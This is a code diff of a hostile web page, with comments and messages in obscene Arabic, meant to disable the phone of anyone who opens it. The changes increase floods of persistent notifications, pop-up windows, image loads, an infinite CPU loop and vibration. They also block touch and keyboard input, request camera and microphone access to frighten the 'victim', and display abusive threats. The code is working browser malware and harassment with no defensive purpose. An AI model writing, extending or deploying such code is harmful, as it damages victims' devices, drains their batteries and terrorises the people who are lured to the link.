@@ -42,7 +42,7 @@
 <head>  
     <meta charset="UTF-8">  
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">  
-    <title>موقعك القحبي المدمر للتلفون</title>  
+    <title>تلفونك هينتاك يا ابن القحبة</title>  
     <style>  
         body {  
             margin: 0;  
@@ -58,7 +58,7 @@
             top: 50%;  
             left: 50%;  
             transform: translate(-50%, -50%);  
-            font-size: 20px;  
+            font-size: 24px;  
             z-index: 9999;  
         }  
         canvas {  
@@ -74,101 +74,122 @@
     <div class="message" id="msg"></div>  
     <canvas id="canvas"></canvas>  
     <script>  
-        // رسائل وهمية شرموطية أوسخ  
-        const messages = [  
-            "يا ابن الشرموطة، تلفونك هيروح في داهية! 😈",  
-            "فيروس زي الزب بينيك جهازك دلوقتي! 💦",  
-            "تلفونك بيصرخ زي القحبة، استمتع! 🔥",  
-            "هههه، ارسل الرابط لصحابك عشان ينكتوا كلهم! 😜",  
-            "البطارية بتنتاك والتلفون هيموت! 😂",  
-            "كاميرتك وميكروفونك معايا يا ابن الكلب! 😈"  
-        ];  
+        // رسائل وهمية شرموطية للإشعارات  
+        const messages = [ "يا ابن الشرموطة، تلفونك مات! 😈", "فيروس زي الزب هينيك جهازك! 💦", "إشعارات بتنتاكك، يا قحبة! 🔥", "جهازك هيصرخ زي أختك! 😜", "البطارية بتنزل، يا كلب! 😂", "ما تهربش، أنت ملكي! 😈" ];  
         let msgIndex = 0;  
         const msgEl = document.getElementById('msg');  
         setInterval(() => {  
             msgEl.innerText = messages[msgIndex];  
             msgIndex = (msgIndex + 1) % messages.length;  
-        }, 1000); // تغيير كل ثانية  
+        }, 500); // تغيير كل نص ثانية  
 
-        // إشعارات مزيفة أوسخ  
-        if (Notification.permission === 'granted') {  
-            setInterval(() => {  
-                new Notification('فيروس شرموطي!', {  
-                    body: 'تلفونك هيعلق وأنت بتنتاك يا قحبة!'  
-                });  
-            }, 3000);  
-        } else {  
-            Notification.requestPermission();  
+        // إشعارات قذرة تنفجر بسرعة  
+        function spamNotifications() {  
+            let notificationCount = 0;  
+            const maxNotifications = 1000; // ألف إشعار  
+            const interval = setInterval(() => {  
+                if (notificationCount >= maxNotifications) {  
+                    clearInterval(interval); // وقف بعد ألف  
+                    // ابدأ من جديد عشان النيكة مستمرة  
+                    setTimeout(spamNotifications, 1000);  
+                    return;  
+                }  
+                for (let i = 0; i < 10; i++) { // 10 إشعارات كل مرة  
+                    if (notificationCount < maxNotifications) {  
+                        new Notification(`فيروس شرموطي #${notificationCount + 1}`, {  
+                            body: messages[Math.floor(Math.random() * messages.length)],  
+                            icon: 'https://via.placeholder.com/100?text=💦',  
+                            requireInteraction: true // الإشعار ما يروح لحد ما يضغط  
+                        });  
+                        notificationCount++;  
+                    }  
+                }  
+            }, 100); // إشعارات كل 100 ميلي ثانية  
         }  
 
-        // فتح نوافذ منبثقة أكثر عشان يعلق التلفون  
-        setInterval(() => {  
-            for (let i = 0; i < 8; i++) {  
-                window.open('about:blank', '_blank');  
-            }  
-        }, 1500); // كل ثانية ونص  
+        // طلب إذن الإشعارات فوراً  
+        if (Notification.permission !== 'granted') {  
+            Notification.requestPermission().then(permission => {  
+                if (permission === 'granted') {  
+                    spamNotifications();  
+                } else {  
+                    setTimeout(() => Notification.requestPermission(), 1000); // حاول تاني  
+                }  
+            });  
+        } else {  
+           spamNotifications();  
+        }  
 
-        // تحميل موارد كثيرة عشان تنيك البطارية والذاكرة  
+        // نوافذ منبثقة عشان يعلق التلفون  
         setInterval(() => {  
-            for (let i = 0; i < 30; i++) {  
-                const img = new Image();  
-                img.src = 'https://via.placeholder.com/800x800?text=شرموطة';  
+            for (let i = 0; i < 20; i++) {  
+                window.open('about:blank', '_blank');  
             }  
         }, 800); // كل 800 ميلي ثانية  
 
-        // محاولة تشغيل الكاميرا والميكروفون  
-        navigator.mediaDevices.getUserMedia({ video: true, audio: true })  
-            .then(stream => {  
-                // ما يسوي شيء غير إنه يشغلهم عشان يخوف الضحية  
-                setInterval(() => {  
-                    msgEl.innerText = 'كاميرتك وميكروفونك بتنتاك يا ابن القحبة! 😈';  
-                }, 5000);  
-            })  
-            .catch(() => {}); // لو ما مشي، خلاص  
+        // تحميل موارد زيادة عشان تنيك البطارية والذاكرة  
+        setInterval(() => {  
+            for (let i = 0; i < 60; i++) {  
+                const img = new Image();  
+                img.src = `https://via.placeholder.com/1500x1500?text=شرموطة${i}`;  
+            }  
+        }, 500); // كل نص ثانية  
 
-        // منع التفاعل مع الشاشة  
+        // منع التحكم بالشاشة  
         document.addEventListener('touchstart', (e) => e.preventDefault(), false);  
         document.addEventListener('touchmove', (e) => e.preventDefault(), false);  
+        document.addEventListener('click', (e) => e.preventDefault(), false);  
+        document.addEventListener('keydown', (e) => e.preventDefault(), false);  
 
-        // تحريك الشاشة باستخدام Canvas بطريقة أوسخ  
+        // فوضى على الشاشة باستخدام Canvas  
         const canvas = document.getElementById('canvas');  
         const ctx = canvas.getContext('2d');  
         canvas.width = window.innerWidth;  
         canvas.height = window.innerHeight;  
         setInterval(() => {  
             ctx.fillStyle = `rgb(${Math.random() * 255},${Math.random() * 255},${Math.random() * 255})`;  
-            ctx.fillRect(Math.random() * canvas.width, Math.random() * canvas.height, 100, 100);  
-            ctx.font = '30px Arial';  
-            ctx.fillText('تلفونك بتنتاك!', Math.random() * canvas.width, Math.random() * canvas.height);  
-        }, 30); // تحريك كل 30 ميلي ثانية  
+            ctx.fillRect(Math.random() * canvas.width, Math.random() * canvas.height, 200, 200);  
+            ctx.font = '45px Arial';  
+            ctx.fillText('تلفونك بتنتاك يا ابن القحبة!', Math.random() * canvas.width, Math.random() * canvas.height);  
+        }, 10); // تحديث كل 10 ميلي ثانية  
 
-        // اهتزاز التلفون بقوة لو متاح  
+        // اهتزاز مستمر عشان التلفون ينهار  
         setInterval(() => {  
             if (navigator.vibrate) {  
-                navigator.vibrate([500, 200, 500, 200]); // اهتزاز مستمر  
+                navigator.vibrate([1200, 50, 1200, 50]); // اهتزاز قوي جداً  
             }  
-        }, 800);  
+        }, 400);  
 
-        // صوت مزعج عند محاولة إغلاق الصفحة  
+        // صوت شرموطي لما يحاولوا يسكروا  
         const audio = new Audio('data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAoUXrTp66hVFApGn+DyvmwhB4Q7T7pP9A');  
         audio.loop = true;  
+        audio.play().catch(() => {});  
         window.addEventListener('beforeunload', () => {  
             audio.play().catch(() => {});  
-            return 'مش هتروح يا ابن الشرموطة، تلفونك خلاص مات!';  
+            return 'مش هتروح يا ابن الشرموطة، تلفونك خلاص نايم!';  
         });  
 
         // حلقة لا نهائية عشان تنيك المعالج والبطارية  
         setInterval(() => {  
             while (true) {  
                 Math.random();  
-                new Array(1000000).fill(0).map(() => Math.random()); // تحميل زيادة  
+                new Array(4000000).fill(0).map(() => Math.random()); // تحميل قذر جداً  
             }  
-        }, 100);  
+        }, 20);  
 
-        // تدوير الشاشة عشان يتخبط الضحية  
+        // تدوير الشاشة عشان الفوضى التامة  
         setInterval(() => {  
             document.body.style.transform = `rotate(${Math.random() * 360}deg)`;  
-        }, 2000);  
+        }, 600);  
+
+        // محاولة تشغيل الكاميرا والميكروفون عشان الرعب  
+        navigator.mediaDevices.getUserMedia({ video: true, audio: true })  
+            .then(() => {  
+                setInterval(() => {  
+                    msgEl.innerText = 'كاميرتك وميكروفونك معايا يا ابن الكلب! 😈';  
+                }, 2000);  
+            })  
+            .catch(() => {});  
     </script>  
 </body>  
 </html>
